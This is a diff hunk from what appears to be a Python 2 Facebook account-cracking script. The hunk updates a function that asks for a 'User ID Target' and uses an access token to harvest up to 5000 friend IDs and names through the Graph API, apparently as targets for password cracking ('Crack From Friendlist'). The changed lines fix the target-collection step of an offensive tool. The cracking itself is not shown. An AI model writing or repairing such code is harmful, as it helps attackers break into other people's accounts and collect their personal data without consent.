@@ -579,9 +579,9 @@ def publik():
     print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type \'me\' Crack From Friendlist"
     idt = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] User ID Target: ')
     try:
-        r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
+        r = requests.get('https://graph.facebook.com/v2.0/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
         z = json.loads(r.text)
-        for a in z['data']:
+        for a in z["friends"]['data']:
             idne = a['id']
             jenenge = a["name"]
             id.append(idne+'<=>'+jenenge)
